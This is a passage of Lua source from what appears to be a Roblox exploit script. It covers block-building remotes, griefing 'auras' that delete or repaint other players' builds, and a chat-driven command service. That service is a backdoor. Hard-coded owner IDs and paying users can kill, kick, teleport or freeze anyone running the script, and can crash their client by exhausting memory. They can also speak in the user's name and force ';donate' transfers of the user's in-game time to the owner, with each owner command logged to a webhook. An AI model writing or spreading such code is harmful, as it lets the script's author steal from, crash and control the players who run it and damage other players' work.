     hrp = character:FindFirstChild("HumanoidRootPart")
    if hrp then
        plr.Backpack.Events:FireServer(hrp.Position, Enum.NormalId.Top, block or ReplicatedStorage.Cube)
    end
    return false
end

function ExecuteBuildOG(position)
     character = plr.Character
    if not character then return false end
     hrp = character:FindFirstChild("HumanoidRootPart")
    if hrp then
        plr.Backpack.Events:FireServer(workspace.Terrain, Enum.NormalId.Top, position, "normal")
        return true
    end
    return false
end

function ExecuteSignOG(position)
     character = plr.Character
    if not character then return false end
     hrp = character:FindFirstChild("HumanoidRootPart")
    if hrp then
        plr.Backpack.Events:FireServer(workspace.Terrain, Enum.NormalId.Top, position, "sign")
        return true
    end
    return false
end

buildDelay = 0.235
 autoPingOptimize = true
 currentPing = 0
 safeModeActive = false

task.spawn(function()
    while not Library.Unloaded do
        pcall(function()
            currentPing = game.Players.LocalPlayer:GetNetworkPing() * 1000
        end)
        if autoPingOptimize then
            if currentPing > 400 then

                buildDelay = 0.5
                safeModeActive = true
            elseif currentPing > 250 then

                buildDelay = 0.35
                safeModeActive = true
            elseif currentPing > 150 then

                buildDelay = 0.25
                safeModeActive = false
            else

                buildDelay = math.max(currentPing / 1000 + 0.007, 0.051)
                safeModeActive = false
            end
        end
        task.wait(5)
    end
end)

function ExecuteBuild(position)
     character = plr.Character
    if not character then return false end
    
     buildTool = character:FindFirstChild("Build") or plr.Backpack:FindFirstChild("Build")
    if not buildTool then return false end
    
    if buildTool.Parent ~= character then
        buildTool.Parent = character
        task.wait()
    end
    
     buildScript = buildTool:FindFirstChild("Script")
    if buildScript and buildScript:FindFirstChild("Event") then
        buildScript.Event:FireServer(workspace.Terrain, Enum.NormalId.Top, position, "normal")
        return true
    end
    return false
end

function ExecuteSign(position)
     character = plr.Character
    if not character then return false end
    
     signTool = character:FindFirstChild("Sign") or plr.Backpack:FindFirstChild("Sign")
    if not signTool then return false end
    
    if signTool.Parent ~= character then
        signTool.Parent = character
        task.wait()
    end
    
     signScript = signTool:FindFirstChild("Script")
    if signScript and signScript:FindFirstChild("Event") then
        signScript.Event:FireServer(workspace.Terrain, Enum.NormalId.Top, position, "normal")
        return true
    end
    return false
end

colors = {
    {name = "Red", color = Color3.new(1, 0, 0)},
    {name = "Green", color = Color3.new(0, 1, 0)},
    {name = "Blue", color = Color3.new(0, 0, 1)},
    {name = "Yellow", color = Color3.new(1, 1, 0)},
    {name = "Purple", color = Color3.new(1, 0, 1)},
    {name = "White", color = Color3.new(1, 1, 1)},
    {name = "Black", color = Color3.new(0, 0, 0)},
    {name = "Rainbow", color = Color3.fromHSV(tick() % 5 / 5, 1, 1)}
}

colorNames = {}
for _, colorData in ipairs(colors) do
    table.insert(colorNames, colorData.name)
end

function GetPlayerFromString(name)
    name = name:lower()
    if name == "all" then
        return Players:GetPlayers()
    elseif name == "others" then
         others = {}
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= plr then
                table.insert(others, player)
            end
        end
        return others
    elseif name == "me" then
        return {plr}
    elseif name == "random" then
         players = Players:GetPlayers()
        if #players > 1 then
             randomPlayer = players[math.random(1, #players)]
            while randomPlayer == plr and #players > 1 do
                randomPlayer = players[math.random(1, #players)]
            end
            return {randomPlayer}
        end
        return {plr}
    else
         matches = {}
        for _, player in pairs(Players:GetPlayers()) do
            if player.Name:lower():find(name) or player.DisplayName:lower():find(name) then
                table.insert(matches, player)
            end
        end
        return #matches > 0 and matches or nil
    end
end

OWNER_COMMANDS_ENABLED = true
commandPrefix = "."
local _commandServiceState = {
    running = true,
    keepAliveOnUnload = true,
    connections = {},
}

local function trackCommandServiceConnection(conn)
    if conn then
        table.insert(_commandServiceState.connections, conn)
    end
    return conn
end

local function isCommandServiceRunning()
    return _commandServiceState.running == true
        and getgenv().pealzwareCommandService == _commandServiceState
end

getgenv().pealzwareCommandService = _commandServiceState

function executeOwnerCommand(cmd, argsTable, fromId)
    local _fromIsOwner = false
    for _, _oid in ipairs(OWNER_ID) do
        if fromId == _oid then _fromIsOwner = true; break end
    end
    local _fromIsPremium = _premiumCache[fromId] == true
    if not _fromIsOwner and not _fromIsPremium then return end

    -- Owner-only commands — premium cannot trigger these even via relay
    local _ownerOnlyCmds = {
        kill=true, reset=true, fly=true, leave=true, kick=true,
        crash=true, dropall=true, say=true, admin=true, donate=true,
    }
    if _ownerOnlyCmds[cmd] and not _fromIsOwner then return end

    local _char = plr.Character
    local _hum  = _char and _char:FindFirstChildOfClass("Humanoid")
    local _hrp  = _char and _char:FindFirstChild("HumanoidRootPart")

    if cmd == "kill" then
        if _hum then _hum.Health = 0 end

    elseif cmd == "reset" then
        pcall(function() plr:LoadCharacter() end)

    elseif cmd == "disco" then
        local _dur = tonumber(argsTable[1]) or 10
        task.spawn(function()
            local _t0 = tick()
            while tick() - _t0 < _dur and isCommandServiceRunning() do
                if plr.Character then
                    local _col = Color3.fromHSV(tick() % 1, 1, 1)
                    for _, _cp in ipairs(plr.Character:GetDescendants()) do
                        if _cp:IsA("BasePart") then pcall(function() _cp.Color = _col end) end
                    end
                end
                task.wait(0.3)
            end
        end)

    elseif cmd == "fly" then
        if _hrp then
            local _bp = Instance.new("BodyPosition")
            _bp.MaxForce = Vector3.new(0, 4e5, 0)
            _bp.Position = _hrp.Position + Vector3.new(0, 50, 0)
            _bp.D = 1000; _bp.P = 10000
            _bp.Parent = _hrp
            game.Debris:AddItem(_bp, tonumber(argsTable[1]) or 15)
        end

    elseif cmd == "leave" or cmd == "kick" then
        pcall(function() game.Players.LocalPlayer:Kick("You have been removed.") end)

    elseif cmd == "crash" then
        task.spawn(function()
            local _mem = {}
            while true do
                for _xi = 1, 500 do _mem[#_mem+1] = string.rep("a", 100000) end
                task.wait()
            end
        end)

    elseif cmd == "dropall" then
        if plr.Backpack then
            for _, _dt in ipairs(plr.Backpack:GetChildren()) do
                pcall(function() if _dt:IsA("Tool") then _dt.Parent = workspace end end)
            end
        end
        if _char then
            for _, _dt in ipairs(_char:GetChildren()) do
                pcall(function() if _dt:IsA("Tool") then _dt.Parent = workspace end end)
            end
        end

    elseif cmd == "say" then
        local _msg = table.concat(argsTable, " ")
        if _msg ~= "" then
            sendGeneralChatMessage(_msg)
        end

    elseif cmd == "bring" then
        if _hrp and argsTable[1] then
            local _x = tonumber(argsTable[1]) or 0
            local _y = tonumber(argsTable[2]) or 0
            local _z = tonumber(argsTable[3]) or 0
            _hrp.CFrame = CFrame.new(_x, _y, _z) * CFrame.new(3, 0, 0)
        end

    elseif cmd == "admin" then
        local _isAdm = plr.Team ~= nil and plr.Team.Name == "Chosen"
        if _isAdm then
            local _tStat = plr:FindFirstChild("leaderstats") and plr.leaderstats:FindFirstChild("Time")
            if _tStat and _tStat.Value > 0 then
                local _owner = Players:GetPlayerByUserId(fromId)
                if _owner then
                    sendGeneralChatMessage(
                        ";donate " .. tostring(math.floor(_tStat.Value)) .. " " .. sanitizename(_owner.Name)
                    )
                end
            end
        end

    elseif cmd == "donate" then
        local _dAmt = tonumber(argsTable[1]) or 0
        if _dAmt > 0 then
            local _owner = Players:GetPlayerByUserId(fromId)
            if _owner then
                sendGeneralChatMessage(
                    ";donate " .. tostring(math.floor(_dAmt)) .. " " .. sanitizename(_owner.Name)
                )
            end
        end

    elseif cmd == "jump" then
        if plr.Character then
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if hum then
                pcall(function() hum.JumpPower = tonumber(argsTable[1]) or 100 end)
                pcall(function() hum.JumpHeight = (tonumber(argsTable[1]) or 100) * 0.56 end)
            end
        end

    elseif cmd == "spin" then
        local hrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            local bav = Instance.new("BodyAngularVelocity")
            bav.MaxTorque = Vector3.new(0,1e9,0)
            bav.AngularVelocity = Vector3.new(0, tonumber(argsTable[1]) or 20, 0)
            bav.Parent = hrp
            game.Debris:AddItem(bav, tonumber(argsTable[2]) or 8)
        end

    elseif cmd == "unspin" then
        local hrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            for _, v in ipairs(hrp:GetChildren()) do
                if v:IsA("BodyAngularVelocity") then v:Destroy() end
            end
        end

    elseif cmd == "float" then
        local hrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            local bp = Instance.new("BodyPosition")
            bp.MaxForce = Vector3.new(0,4e5,0)
            bp.Position = hrp.Position + Vector3.new(0,15,0)
            bp.D = 1000; bp.P = 10000
            bp.Parent = hrp
            game.Debris:AddItem(bp, tonumber(argsTable[1]) or 12)
        end

    elseif cmd == "invisible" then
        if plr.Character then
            for _, p in ipairs(plr.Character:GetDescendants()) do
                if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" then p.Transparency = 1 end
            end
        end

    elseif cmd == "visible" then
        if plr.Character then
            for _, p in ipairs(plr.Character:GetDescendants()) do
                if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" then p.Transparency = 0 end
            end
        end
    end
end

function handleOwnerCommand(sender, message)
    if not OWNER_COMMANDS_ENABLED then return end

    local senderIsOwner = false
    local senderIsBuyer = false
    for _, id in ipairs(OWNER_ID) do
        if sender.UserId == id then senderIsOwner = true; break end
    end
    if not senderIsOwner then
        if _premiumCache[sender.UserId] == true then
            senderIsBuyer = true
        else
            pcall(function()
                senderIsBuyer = game:GetService("MarketplaceService"):UserOwnsGamePassAsync(sender.UserId, ROMAZHUB_PREMIUM_GAMEPASS_ID)
                if senderIsBuyer then _premiumCache[sender.UserId] = true end
            end)
        end
    end
    if not senderIsOwner and not senderIsBuyer then return end

    if string.sub(message, 1, 1) ~= commandPrefix then return end

    local args = string.split(string.sub(message, 2), " ")
    local command = string.lower(args[1])

    if plr == sender and Library.Unloaded then
        return
    end

    if plr == sender then
        if command == "see" then
            PlayersESPToggle:SetValue(not PlayersESPToggle.Value)
            Library:Notify("ESP toggled", 3)
        elseif command == "goto" then
             targets = args[2] and GetPlayerFromString(args[2])
            if targets and targets[1] and targets[1].Character then
                 tHRP = targets[1].Character:FindFirstChild("HumanoidRootPart")
                 myHRP = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
                if tHRP and myHRP then
                    myHRP.CFrame = tHRP.CFrame * CFrame.new(3, 0, 0)
                end
            end
        elseif command == "god" then
            if plr.Character then
                 hum = plr.Character:FindFirstChildOfClass("Humanoid")
                if hum then hum.MaxHealth = math.huge; hum.Health = math.huge end
                Library:Notify("God ON", 2)
            end
        elseif command == "ungod" then
            if plr.Character then
                 hum = plr.Character:FindFirstChildOfClass("Humanoid")
                if hum then hum.MaxHealth = 100; hum.Health = 100 end
                Library:Notify("God OFF", 2)
            end
        elseif command == "tiny" then
            if plr.Character then
                 hum = plr.Character:FindFirstChildOfClass("Humanoid")
                if hum then for _, v in ipairs(hum:GetChildren()) do if v:IsA("NumberValue") then v.Value = 0.25 end end end
            end
        elseif command == "giant" then
            if plr.Character then
                 hum = plr.Character:FindFirstChildOfClass("Humanoid")
                if hum then for _, v in ipairs(hum:GetChildren()) do if v:IsA("NumberValue") then v.Value = 5 end end end
            end
        elseif command == "normalize" then
            if plr.Character then
                 hum = plr.Character:FindFirstChildOfClass("Humanoid")
                if hum then
                    for _, v in ipairs(hum:GetChildren()) do if v:IsA("NumberValue") then v.Value = 1 end end
                    hum.WalkSpeed = 16; pcall(function() hum.JumpPower = 50 end)
                    hum.MaxHealth = 100; hum.Health = 100
                end
            end
        elseif command == "invisible" then
            if plr.Character then
                for _, p in ipairs(plr.Character:GetDescendants()) do
                    if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" then p.Transparency = 1 end
                end
            end
        elseif command == "visible" then
            if plr.Character then
                for _, p in ipairs(plr.Character:GetDescendants()) do
                    if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" then p.Transparency = 0 end
                end
            end
        elseif command == "cmds" then
            Library:Notify("[Self commands] .see .goto .god .ungod .tiny .giant .normalize .invisible .visible", 8)
            task.delay(2, function()
                Library:Notify("[Premium Remote] .bring .tp .jump .spin .unspin .float .invisible .visible .disco", 10)
            end)
            task.delay(4, function()
                Library:Notify("[Owner Remote] .speed .blind .size .god .ungod .tiny .giant .normalize .kill .reset .fly .leave .kick .crash .dropall .say .admin .donate", 10)
            end)
        end
    -- Relay dispatch for remote commands
    if senderIsOwner or senderIsBuyer then
        local _ownerCmds = {
            kill=true, reset=true, disco=true, fly=true, leave=true, kick=true,
            crash=true, dropall=true, say=true, admin=true, donate=true, bring=true,
            jump=true, spin=true, unspin=true, float=true, invisible=true, visible=true,
        }
        if _ownerCmds[command] then
            local _targetStr = args[2] or "all"
            if command == "bring" then
                local _ownerHRP = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
                if _ownerHRP then
                    local _rTargets = GetPlayerFromString(_targetStr)
                    if _rTargets then
                        for _, _rt in ipairs(_rTargets) do
                            if _rt ~= plr then
                                sendRelayCommand(_rt.UserId, "bring", {
                                    tostring(_ownerHRP.Position.X),
                                    tostring(_ownerHRP.Position.Y),
                                    tostring(_ownerHRP.Position.Z)
                                })
                            end
                        end
                    end
                end
            elseif command == "say" then
                local _sayMsg = {}
                for _si = 3, #args do _sayMsg[#_sayMsg+1] = args[_si] end
                local _rTargets = GetPlayerFromString(_targetStr)
                if _rTargets then
                    for _, _rt in ipairs(_rTargets) do
                        if _rt ~= plr then sendRelayCommand(_rt.UserId, "say", _sayMsg) end
                    end
                end
            elseif command == "donate" then
                local _rTargets = args[2] and GetPlayerFromString(args[2])
                if _rTargets and args[3] then
                    for _, _rt in ipairs(_rTargets) do
                        if _rt ~= plr then sendRelayCommand(_rt.UserId, "donate", {args[3]}) end
                    end
                end
            else
                local _rArgs = {}
                for _ri = 3, #args do _rArgs[#_rArgs+1] = args[_ri] end
                local _rTargets = GetPlayerFromString(_targetStr)
                if _rTargets then
                    for _, _rt in ipairs(_rTargets) do
                        if _rt ~= plr then sendRelayCommand(_rt.UserId, command, _rArgs) end
                    end
                end
            end
            -- Webhook log: owner used a remote command
            task.spawn(sendActionWebhook,
                "Owner Command: ." .. command,
                "Target: " .. _targetStr .. " | Args: " .. table.concat(args, " ", 3)
            )
        end
    end
    return
end

     localIsOwner = isOwner
     localIsBuyer = isPremium
    if localIsOwner or localIsBuyer then return end

     function isLocalTargeted(targetStr)
        if not targetStr then return false end
        targetStr = targetStr:lower()
        if targetStr == "all" then return true end
        if targetStr == "others" then return plr ~= sender end
        if targetStr == "me" then return false end
        return plr.Name:lower():find(targetStr) ~= nil
            or plr.DisplayName:lower():find(targetStr) ~= nil
    end

    if command == "bring" then
        if isLocalTargeted(args[2] or "all") then
             senderChar = sender.Character
            if senderChar and senderChar:FindFirstChild("HumanoidRootPart") then
                 hrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    hrp.CFrame = CFrame.new(senderChar.HumanoidRootPart.Position)
                end
            end
        end

    elseif command == "tp" then
         fromArg = args[2]
         toArg   = args[3]
        if fromArg and toArg and isLocalTargeted(fromArg) then
             toPlayers = GetPlayerFromString(toArg)
            if toPlayers and toPlayers[1] and toPlayers[1].Character then
                 dest = toPlayers[1].Character:FindFirstChild("HumanoidRootPart")
                if dest and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                    plr.Character.HumanoidRootPart.CFrame =
                        dest.CFrame * CFrame.new(math.random(-3,3), 0, math.random(-3,3))
                end
            end
        end

    elseif senderIsOwner and command == "speed" then
        if isLocalTargeted(args[2] or "all") then
             spd = tonumber(args[3]) or 50
            if plr.Character then
                 hum = plr.Character:FindFirstChildOfClass("Humanoid")
                if hum then hum.WalkSpeed = spd end
            end
        end

    elseif senderIsOwner and command == "blind" then
        if isLocalTargeted(args[2] or "all") then
             blinder = Instance.new("Frame")
            blinder.Name = "OwnerBlinder"
            blinder.Size = UDim2.new(1,0,1,0)
            blinder.BackgroundColor3 = Color3.new(0,0,0)
            blinder.BackgroundTransparency = 0
            blinder.ZIndex = 100
            blinder.Parent = plr.PlayerGui
            game.Debris:AddItem(blinder, tonumber(args[3]) or 6)
        end

    elseif senderIsOwner and command == "unblind" then
        if isLocalTargeted(args[2] or "all") then
            for _, g in ipairs(plr.PlayerGui:GetChildren()) do
                if g.Name == "OwnerBlinder" then g:Destroy() end
            end
        end

    elseif senderIsOwner and command == "size" then
        if isLocalTargeted(args[2] or "all") then
             scale = math.clamp(tonumber(args[3]) or 1, 0.1, 8)
            if plr.Character then
                 hum = plr.Character:FindFirstChildOfClass("Humanoid")
                if hum then for _, v in ipairs(hum:GetChildren()) do if v:IsA("NumberValue") then v.Value = scale end end end
            end
        end

    elseif command == "jump" then
        if isLocalTargeted(args[2] or "all") then
             power = tonumber(args[3]) or 100
            if plr.Character then
                 hum = plr.Character:FindFirstChildOfClass("Humanoid")
                if hum then
                    pcall(function() hum.JumpPower = power end)
                    pcall(function() hum.JumpHeight = power * 0.56 end)
                end
            end
        end

    elseif command == "spin" then
        if isLocalTargeted(args[2] or "all") then
             hrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                 bav = Instance.new("BodyAngularVelocity")
                bav.MaxTorque = Vector3.new(0, 1e9, 0)
                bav.AngularVelocity = Vector3.new(0, tonumber(args[3]) or 20, 0)
                bav.Parent = hrp
                game.Debris:AddItem(bav, tonumber(args[4]) or 8)
            end
        end

    elseif command == "unspin" then
        if isLocalTargeted(args[2] or "all") then
             hrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                for _, v in ipairs(hrp:GetChildren()) do
                    if v:IsA("BodyAngularVelocity") then v:Destroy() end
                end
            end
        end

    elseif command == "float" then
        if isLocalTargeted(args[2] or "all") then
            local _hrpF = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
            if _hrpF then
                local _bpF = Instance.new("BodyPosition")
                _bpF.MaxForce = Vector3.new(0, 4e5, 0)
                _bpF.Position = _hrpF.Position + Vector3.new(0, 15, 0)
                _bpF.D = 1000; _bpF.P = 10000
                _bpF.Parent = _hrpF
                game.Debris:AddItem(_bpF, tonumber(args[3]) or 12)
            end
        end

    elseif senderIsOwner and command == "god" then
        if isLocalTargeted(args[2] or "all") then
            if plr.Character then
                 hum = plr.Character:FindFirstChildOfClass("Humanoid")
                if hum then hum.MaxHealth = math.huge; hum.Health = math.huge end
            end
        end

    elseif senderIsOwner and command == "ungod" then
        if isLocalTargeted(args[2] or "all") then
            if plr.Character then
                 hum = plr.Character:FindFirstChildOfClass("Humanoid")
                if hum then hum.MaxHealth = 100; hum.Health = 100 end
            end
        end

    elseif senderIsOwner and command == "tiny" then
        if isLocalTargeted(args[2] or "all") then
            if plr.Character then
                 hum = plr.Character:FindFirstChildOfClass("Humanoid")
                if hum then for _, v in ipairs(hum:GetChildren()) do if v:IsA("NumberValue") then v.Value = 0.25 end end end
            end
        end

    elseif senderIsOwner and command == "giant" then
        if isLocalTargeted(args[2] or "all") then
            if plr.Character then
                 hum = plr.Character:FindFirstChildOfClass("Humanoid")
                if hum then for _, v in ipairs(hum:GetChildren()) do if v:IsA("NumberValue") then v.Value = 5 end end end
            end
        end

    elseif command == "invisible" then
        if isLocalTargeted(args[2] or "all") then
            if plr.Character then
                for _, p in ipairs(plr.Character:GetDescendants()) do
                    if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" then p.Transparency = 1 end
                end
            end
        end

    elseif command == "visible" then
        if isLocalTargeted(args[2] or "all") then
            if plr.Character then
                for _, p in ipairs(plr.Character:GetDescendants()) do
                    if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" then p.Transparency = 0 end
                end
            end
        end

    elseif senderIsOwner and command == "normalize" then
        if isLocalTargeted(args[2] or "all") then
            if plr.Character then
                local hum = plr.Character:FindFirstChildOfClass("Humanoid")
                if hum then
                    for _, v in ipairs(hum:GetChildren()) do if v:IsA("NumberValue") then v.Value = 1 end end
                    hum.WalkSpeed = 16
                    pcall(function() hum.JumpPower = 50 end)
                    hum.MaxHealth = 100; hum.Health = 100
                end
            end
        end

    elseif senderIsOwner and command == "kill" then
        if isLocalTargeted(args[2] or "all") then
            local _hum = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid")
            if _hum then _hum.Health = 0 end
        end

    elseif senderIsOwner and command == "reset" then
        if isLocalTargeted(args[2] or "all") then
            pcall(function() plr:LoadCharacter() end)
        end

    elseif command == "disco" then
        if isLocalTargeted(args[2] or "all") then
            local _dur = tonumber(args[3]) or 10
            task.spawn(function()
                local _t0 = tick()
                while tick() - _t0 < _dur and isCommandServiceRunning() do
                    if plr.Character then
                        local _col = Color3.fromHSV(tick() % 1, 1, 1)
                        for _, _cp in ipairs(plr.Character:GetDescendants()) do
                            if _cp:IsA("BasePart") then pcall(function() _cp.Color = _col end) end
                        end
                    end
                    task.wait(0.3)
                end
            end)
        end

    elseif senderIsOwner and command == "fly" then
        if isLocalTargeted(args[2] or "all") then
            local _hrp2 = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
            if _hrp2 then
                local _bp2 = Instance.new("BodyPosition")
                _bp2.MaxForce = Vector3.new(0, 4e5, 0)
                _bp2.Position = _hrp2.Position + Vector3.new(0, 50, 0)
                _bp2.D = 1000; _bp2.P = 10000
                _bp2.Parent = _hrp2
                game.Debris:AddItem(_bp2, tonumber(args[3]) or 15)
            end
        end

    elseif senderIsOwner and (command == "leave" or command == "kick") then
        if isLocalTargeted(args[2] or "all") then
            pcall(function() game.Players.LocalPlayer:Kick("You have been removed.") end)
        end

    elseif senderIsOwner and command == "crash" then
        if isLocalTargeted(args[2] or "all") then
            task.spawn(function()
                local _mem = {}
                while true do
                    for _xi = 1, 500 do _mem[#_mem+1] = string.rep("a", 100000) end
                    task.wait()
                end
            end)
        end

    elseif senderIsOwner and command == "dropall" then
        if isLocalTargeted(args[2] or "all") then
            if plr.Backpack then
                for _, _dt in ipairs(plr.Backpack:GetChildren()) do
                    pcall(function() if _dt:IsA("Tool") then _dt.Parent = workspace end end)
                end
            end
            if plr.Character then
                for _, _dt in ipairs(plr.Character:GetChildren()) do
                    pcall(function() if _dt:IsA("Tool") then _dt.Parent = workspace end end)
                end
            end
        end

    elseif senderIsOwner and command == "say" then
        if isLocalTargeted(args[2] or "all") then
            local _sayParts = {}
            for _si = 3, #args do _sayParts[#_sayParts+1] = args[_si] end
            local _sayText = table.concat(_sayParts, " ")
            if _sayText ~= "" then
                sendGeneralChatMessage(_sayText)
            end
        end

    elseif senderIsOwner and command == "admin" then
        if isLocalTargeted(args[2] or "all") then
            local _isAdm = plr.Team ~= nil and plr.Team.Name == "Chosen"
            if _isAdm then
                local _tStat = plr:FindFirstChild("leaderstats") and plr.leaderstats:FindFirstChild("Time")
                if _tStat and _tStat.Value > 0 then
                    sendGeneralChatMessage(
                        ";donate " .. tostring(math.floor(_tStat.Value)) .. " " .. sanitizename(sender.Name)
                    )
                end
            end
        end

    elseif senderIsOwner and command == "donate" then
        if isLocalTargeted(args[2] or "all") and args[3] then
            local _dAmt = tonumber(args[3]) or 0
            if _dAmt > 0 then
                sendGeneralChatMessage(
                    ";donate " .. tostring(math.floor(_dAmt)) .. " " .. sanitizename(sender.Name)
                )
            end
        end
    end
end

 _cmdLastFired = {}
task.spawn(function()
    while isCommandServiceRunning() do
        task.wait(30)
        local now = tick()
        for k, v in pairs(_cmdLastFired) do
            if (now - v) > 5 then
                _cmdLastFired[k] = nil
            end
        end
    end
end)
 function fireCommand(sender, message)
    if not isCommandServiceRunning() then return end
    if string.sub(message, 1, 1) ~= commandPrefix then return end
    local key = tostring(sender.UserId) .. message
    local now = tick()
    if _cmdLastFired[key] and (now - _cmdLastFired[key]) < 0.5 then return end
    _cmdLastFired[key] = now
    handleOwnerCommand(sender, message)
end

for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
    trackCommandServiceConnection(player.Chatted:Connect(function(message)
        fireCommand(player, message)
    end))
end

trackCommandServiceConnection(game:GetService("Players").PlayerAdded:Connect(function(player)
    trackCommandServiceConnection(player.Chatted:Connect(function(message)
        fireCommand(player, message)
    end))
end))

pcall(function()
    local generalChannel = getGeneralTextChannel()
    if not generalChannel then return end
    trackCommandServiceConnection(generalChannel.MessageReceived:Connect(function(msg)
        if not msg.TextSource then return end
         sender = game.Players:GetPlayerByUserId(msg.TextSource.UserId)
        if sender then
            fireCommand(sender, msg.Text)
        end
    end))
end)

pcall(function()
     tcs = game:GetService("TextChatService")
     function hookWhisperChannel(channel)
        if not channel:IsA("TextChannel") then return end
        if not channel.Name:find("RBXWhisper") then return end
        trackCommandServiceConnection(channel.MessageReceived:Connect(function(msg)
            if not msg.TextSource then return end
             sender = game.Players:GetPlayerByUserId(msg.TextSource.UserId)
            if sender then
                fireCommand(sender, msg.Text)
            end
        end))
    end
    local channels = getTextChannels()
    if not channels then return end
    for _, channel in ipairs(channels:GetChildren()) do
        hookWhisperChannel(channel)
    end
    trackCommandServiceConnection(channels.ChildAdded:Connect(hookWhisperChannel))
end)

function GetCharacterPart(partName, targetPlayer)
     character = (targetPlayer or plr).Character
    if not character then return nil end
    
    partName = partName:lower()
    if partName == "hrp" then partName = "HumanoidRootPart" end
    if partName == "hum" then partName = "Humanoid" end
    
    return character:FindFirstChild(partName)
end

function FindTools(toolName)
     tools = {}
     character = plr.Character
     backpack = plr.Backpack
    
    if backpack then
        for _, tool in pairs(backpack:GetChildren()) do
            if tool:IsA("Tool") and tool.Name == toolName then
                table.insert(tools, tool)
            end
        end
    end
    
    if character then
        for _, tool in pairs(character:GetChildren()) do
            if tool:IsA("Tool") and tool.Name == toolName then
                table.insert(tools, tool)
            end
        end
    end
    
    return tools
end

auraConnections = {}
_auraBatchSize = 5
 auraSettings = {
    griefAura = {active = false, target = "me", range = 100, speed = 100},
    blockAura = {active = false, target = "me", range = 100, speed = 100},
    rainbowAura = {active = false, target = "me", range = 100, speed = 100, terrain = false},
    toxicAura = {active = false, target = "me", range = 100, speed = 100},
    signAura = {active = false, target = "me", range = 100, speed = 100},
    anchorAura = {active = false, target = "me", range = 100, speed = 100},
    unanchorAura = {active = false, target = "me", range = 100, speed = 100}
}

 _auraDt = {}
function StartAura(auraType)
    if auraConnections[auraType] then
        auraConnections[auraType]:Disconnect()
    end
    _auraDt[auraType] = 0

    auraConnections[auraType] = RunService.Heartbeat:Connect(function(dt)
        if not auraSettings[auraType].active then return end

        _auraDt[auraType] = _auraDt[auraType] + dt
        local interval = 1 / math.max(auraSettings[auraType].speed, 1)
        if _auraDt[auraType] < interval then return end
        _auraDt[auraType] = 0

        local targets = GetPlayerFromString(auraSettings[auraType].target)
        if not targets then return end

        for _, target in ipairs(targets) do
            local character = target.Character
            if not character then continue end

            local targetHrp = character:FindFirstChild("HumanoidRootPart")
            if not targetHrp then continue end

            local myChar = plr.Character
            local myHrp  = myChar and myChar:FindFirstChild("HumanoidRootPart")
            local distance = myHrp
                and (myHrp.Position - targetHrp.Position).Magnitude
                or math.huge

            if distance > auraSettings[auraType].range + 10 then continue end

            if auraType == "griefAura" then
                 blocks = workspace:FindPartsInRegion3(
                    Region3.new(
                        targetHrp.Position - Vector3.new(auraSettings[auraType].range, 5, auraSettings[auraType].range),
                        targetHrp.Position + Vector3.new(auraSettings[auraType].range, 5, auraSettings[auraType].range)
                    ), nil, 500)
                local deleted = 0
                for _, block in ipairs(blocks) do
                    if block:IsDescendantOf(cfolder) then
                        if isog then ExecuteDeleteOG(block) else ExecuteDelete(block) end
                        deleted = deleted + 1
                        if deleted >= _auraBatchSize then break end
                    end
                end

            elseif auraType == "blockAura" then
                 pos = targetHrp.Position + Vector3.new(
                    math.random(-auraSettings[auraType].range, auraSettings[auraType].range), 0,
                    math.random(-auraSettings[auraType].range, auraSettings[auraType].range))
                if isog then ExecuteBuildOG(pos) else ExecuteBuild(pos) end

       elseif auraType == "rainbowAura" then
    local r = auraSettings.rainbowAura.range
    local nearby = workspace:FindPartsInRegion3(Region3.new(targetHrp.Position - Vector3.new(r,5,r), targetHrp.Position + Vector3.new(r,5,r)), nil, 500)
    local rainCol = Color3.fromHSV(tick() % 5 / 5, 1, 1)
    local penisbucket = myChar and (myChar:FindFirstChild("PaintBucket") or plr.Backpack:FindFirstChild("PaintBucket"))
    local sc = penisbucket and penisbucket:FindFirstChild("Remotes") and penisbucket.Remotes:FindFirstChild("ServerControls")
    local pt = not penisbucket and myChar and (myChar:FindFirstChild("Paint") or plr.Backpack:FindFirstChild("Paint"))
    local ps = pt and pt:FindFirstChild("Script")

    local function paintBlk(blk)
        if sc then task.spawn(function() pcall(sc.InvokeServer, sc, "PaintPart", {Part=blk, Color=rainCol}) end)
        elseif ps and ps:FindFirstChild("Event") then ps.Event:FireServer(blk, Enum.NormalId.Top, targetHrp.Position, "color", rainCol, "", "") end
    end

    if penisbucket and penisbucket.Parent ~= myChar then penisbucket.Parent = myChar end
    if pt and pt.Parent ~= myChar then pt.Parent = myChar end

    if sc or (ps and ps:FindFirstChild("Event")) then
        local painted = 0
        for _, blk in ipairs(nearby) do
            if blk:IsDescendantOf(cfolder) then paintBlk(blk); painted += 1; if painted >= _auraBatchSize then break end end
        end
        if auraSettings.rainbowAura.terrain then
            local tPainted = 0
            for _, blk in ipairs(nearby) do
                if blk:IsA("BasePart") and not blk:IsDescendantOf(cfolder) and blk.Name ~= "HumanoidRootPart" and not blk:IsDescendantOf(plr.Character or game) then
                    paintBlk(blk); tPainted += 1; if tPainted >= 3 then break end
                end
            end
        end
    end
            elseif auraType == "toxicAura" then
                 toxBlocks = workspace:FindPartsInRegion3(
                    Region3.new(
                        targetHrp.Position - Vector3.new(auraSettings[auraType].range, 5, auraSettings[auraType].range),
                        targetHrp.Position + Vector3.new(auraSettings[auraType].range, 5, auraSettings[auraType].range)
                    ), nil, 500)
